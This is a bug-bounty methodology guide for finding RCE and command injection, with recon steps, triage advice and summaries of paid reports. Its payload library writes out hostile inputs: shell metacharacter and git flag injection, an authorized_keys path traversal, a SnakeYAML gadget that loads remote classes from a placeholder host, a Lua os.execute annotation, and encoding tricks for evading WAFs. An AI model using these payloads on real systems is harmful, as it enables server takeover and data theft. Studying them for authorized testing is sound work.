---
category: rce
label: RCE / Command Injection
report_count: 465
programs: [gitlab, ibb, kubernetes, basecamp, x, rails, pixiv, brave, portswigger, valve]
avg_bounty: 6800
max_bounty: 33510
severity_distribution: critical: 21, high: 13, medium: 6

---

## Overview

RCE and command injection bugs break the core invariant that only trusted code runs on the server. These flaws persist because developers pass user input to system-level interpreters, templating engines, or unsafe APIs, often under the assumption that input is sanitized or not attacker-controlled. The worst-case impact is full server compromise, lateral movement, and total data exfiltration.

## Root causes

- Passing user input directly to shell commands, system utilities, or interpreter APIs without strict validation or argument separation.
- Unsafe deserialization or dynamic code execution (e.g., `eval`, `loadstring`, YAML/Marshal deserialization) on attacker-controlled data.
- Trusting file extensions or MIME types rather than inspecting file content before processing with dangerous tools (e.g., ImageMagick, ExifTool).
- Allowing user input to influence configuration files, command-line flags, or template variables that are later interpreted.
- Insecure plugin architectures or extension points that load attacker-supplied code or classes.
- Insufficient sandboxing or isolation in environments that execute user-supplied scripts (e.g., Lua, Python, bash in Airflow/Flink).

## Attack surface

- HTTP parameters, headers, or body fields that are used as arguments to system commands, file paths, or configuration values (e.g., `{param}`, `{filename}`, `{path}`, `{cmd}`).
- Endpoint patterns: import/export handlers, file uploaders, archive extractors, search APIs with ref/branch/flag parameters, plugin/extension loaders, configuration updaters.
- Features: project or repository import/export, image/media processing, markdown/wiki rendering, CI/CD pipeline configuration, ingress/controller configuration in orchestrators, DAG/task parameters in workflow engines.
- Tech stacks: Ruby (Open3, system, backticks, YAML/Marshal deserialization), Python (os.system, subprocess, YAML), Java (Runtime.exec, SnakeYAML), Go (os/exec), Node.js (child_process), C/C++ (system, popen).
- Client-side: JS code that exposes privileged APIs or allows navigation to internal URLs, or that loads/executes user-supplied code (e.g., oEmbed, plugin systems).

## Recon checklist

1. Enumerate all endpoints accepting file uploads, archive imports, or user-supplied configuration.
2. Identify parameters or fields that are used as command-line arguments, file paths, or passed to interpreters.
3. Review API schemas, OpenAPI/Swagger docs, and source code for calls to dangerous APIs (e.g., `system`, `exec`, `eval`, `Open3.popen3`, `os.system`, `Runtime.exec`).
4. Map features that allow user-supplied scripts, templates, or configuration snippets (e.g., markdown, wiki, DAGs, ingress annotations).
5. Inspect client-side JS for privileged API exposure or custom protocol handling.
6. Check for deserialization of untrusted data (YAML, Marshal, Pickle, Java serialization).
7. Analyze file handling logic for extension/MIME trust, and for use of external tools (ImageMagick, ExifTool).
8. Probe for parameters that are reflected in error messages, logs, or configuration files.

## Hunt methodology

1. Identify endpoints/features that process user input with system-level privileges (uploads, imports, config, search, etc.).
2. Send payloads in parameters likely to be used as command-line arguments, file paths, or config values (e.g., `{param}`, `{filename}`, `{path}`).
3. Attempt to inject shell metacharacters (`;`, `&&`, `|`, backticks) or command-line flags (`--output=`, `--no-index`) into these parameters.
4. Upload files with polyglot or crafted content (e.g., PostScript, DjVu, YAML, Lua, serialized objects) and observe processing behaviour.
5. Test for path traversal in file paths or archive extraction to overwrite sensitive files (e.g., `.ssh/authorized_keys`, config files).
6. Probe for SSRF or code execution via plugin loading, extension points, or deserialization gadgets.
7. For orchestrator/configuration targets (e.g., Kubernetes, Airflow), inject config snippets or annotation values that result in code execution.
8. Confirm exploitation by observing side effects: file creation, command output in responses, reverse shell callbacks, or privilege escalation.

## Payload library

### Shell metacharacter injection
**Technique**: Exploit lack of argument separation by injecting shell metacharacters into parameters passed to system shells.
**How to apply**: Supply payloads in `{param}` or `{filename}` fields that are used in shell commands.
**Payload**: `` test;{cmd} ``
**Observe**: Command output in response, file creation, or out-of-band callback.
**Seen in**: Archive extraction in import flows, image/media processing, project importers.

### Command-line flag injection
**Technique**: Inject command-line flags by supplying values starting with `--` in parameters passed to CLI tools.
**How to apply**: Set `{param}` or `{ref}` to `--output={file}` or similar flag.
**Payload**: `` --output=/tmp/{file} ``
**Observe**: File created or overwritten on server, command output redirected.
**Seen in**: Search APIs with ref/branch parameters, commit APIs, import/export features.

### Path traversal to sensitive file overwrite
**Technique**: Use directory traversal in file paths to overwrite sensitive files during upload or extraction.
**How to apply**: Supply `{path}` or `{filename}` with sequences like `../../../../.ssh/authorized_keys`.
**Payload**: `` ../../../../.ssh/authorized_keys ``
**Observe**: Ability to SSH as service user, or overwrite of config files.
**Seen in**: Package registry uploads, archive importers, file upload endpoints.

### Polyglot file upload (ImageTragick, ExifTool, Ghostscript, DjVu)
**Technique**: Upload files with crafted content that triggers code execution in external tools.
**How to apply**: Upload a file with a valid extension but malicious content (e.g., PostScript in image, DjVu with code).
**Payload**: File containing `%!PS ...` or DjVu annotation with `qx{...}`.
**Observe**: Command execution on server, file creation, reverse shell.
**Seen in**: Image/media uploaders, metadata scrubbers.

### Unsafe deserialization/code execution
**Technique**: Supply serialized objects or YAML that trigger code execution on deserialization.
**How to apply**: Send payloads in parameters or files that are deserialized (e.g., YAML, Marshal, Pickle).
**Payload**: `` !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{host}/"]]]] ``
**Observe**: Execution of attacker-supplied code or classes.
**Seen in**: Java/Python/Ruby deserialization, plugin loaders.

### Config/annotation injection (Kubernetes, NGINX, Airflow)
**Technique**: Inject configuration snippets or annotations that are interpolated into server config and executed.
**How to apply**: Set annotation or config fields to include code or directives.
**Payload**: `` content_by_lua_block {os.execute('id')} ``
**Observe**: Command output in HTTP response, file creation, or privilege escalation.
**Seen in**: Ingress controller annotations, Airflow DAG/task parameters.

### Format string injection
**Technique**: Inject format string payloads into parameters used in string formatting APIs.
**How to apply**: Supply `{param}` with format string expressions.
**Payload**: `` {.__class__.__mro__[1].__subclasses__()} ``
**Observe**: Disclosure of sensitive data, or code execution if evaluated.
**Seen in**: Logging endpoints, URL construction, template rendering.

### Dependency confusion / malicious package injection
**Technique**: Register attacker-controlled packages with names matching internal dependencies.
**How to apply**: Publish a package to a public registry and trigger the target to install it.
**Payload**: Malicious package with install-time code execution.
**Observe**: Callback or command execution on developer/CI systems.
**Seen in**: Package managers (npm, pip, gem), build pipelines.

## Filter & WAF bypass

- Use alternate encodings: URL-encode metacharacters (`%3B`, `%26`, `%7C`), Unicode homoglyphs, or double encoding.
- Split payloads across parameters or use line breaks to evade simple regex filters.
- For file uploads, use valid file headers with embedded payloads (polyglots).
- For path traversal, use encoded traversal (`..%2f..%2f`) or repeated traversal sequences.
- For annotation/config injection, use multiline values or comment injection to break out of expected context.
- For shell injection, use `$()` or backticks as alternatives to `;` or `&&`.
- For deserialization, use less common gadgets or serialization formats (YAML, Pickle, Marshal).

## Verification & impact

- **Confirmed vulnerable**: Observable side effects—file creation/overwrite, command output in HTTP response, reverse shell, privilege escalation, or ability to execute arbitrary code.
- **False positive signals**: Input reflected in error messages or logs without execution; file upload succeeds but no code execution; config changes without code path to execution.
- **Impact escalation**: Use file overwrite to gain SSH access, escalate privileges via cron or service files, pivot to internal networks, or extract secrets/configs for further compromise.

## Triage & severity

- Typical CVSS: High to Critical (8.0–10.0), depending on exploitability and privilege required.
- Severity up: Pre-auth RCE, root/system privileges, ability to pivot or exfiltrate sensitive data, exploitability via public endpoints.
- Severity down: Requires authenticated/admin access, limited to sandboxed context, mitigated by SELinux/AppArmor, or only DoS possible.

## Reporting tips

- Strong PoC: Minimal reproducible request (with generic placeholders), clear impact (e.g., file written, command output, shell access), and evidence (screenshots, logs, callback).
- Avoid: Reports with only error messages, no proof of execution, or that require unrealistic attacker control.
- Evidence checklist: Full request/response, payloads used, server-side effect (file, output, callback), privilege level, and impact statement.

## Real examples

- 1609965 — gitlab: RCE via archive path injection in bulk import feature, leading to arbitrary command execution as service user (critical, $33510)
- 1679624 — gitlab: RCE via attacker-controlled object passed to Redis, exploiting protocol parsing (critical, $33510)
- 591295 — x: Pre-auth file read chained with post-auth command injection in SSL VPN, leading to full server compromise (critical, $20160)
- 1125425 — gitlab: RCE via unsafe inline Kramdown options in wiki rendering, allowing arbitrary Ruby object instantiation (critical, $20000)
- 1154542 — gitlab: RCE via ExifTool DjVu parsing in image upload, arbitrary code execution on upload (critical, $20000)
- 587854 — gitlab: Arbitrary file overwrite via archive extraction, leading to SSH key injection and RCE (critical, $12000)
- 658013 — gitlab: Git flag injection via ref parameter, overwriting authorized_keys for shell access (critical, $12000)
- 733072 — gitlab: Path traversal in package registry upload, overwriting authorized_keys for RCE (high, $12000)
- 1707287 — ibb: Apache Airflow format string injection, leaking secrets and enabling further compromise (critical, $8000)
- 682442 — gitlab: Git flag injection in search API, reading sensitive config files (high, $7000)

## Bounty intelligence

Critical RCEs with pre-auth or low-privilege vectors routinely pay $10,000–$30,000+ on major SaaS, infrastructure, and developer platform programs. Features that enable full server compromise, lateral movement, or privilege escalation (especially via file overwrite or code execution as root) are valued highest. Programs with extensive import/export, plugin, or automation features (e.g., code hosting, CI/CD, cloud orchestration) pay the most and often have broad scope for this category. Reports with clear, reproducible impact and minimal attacker prerequisites are most likely to receive top-tier payouts.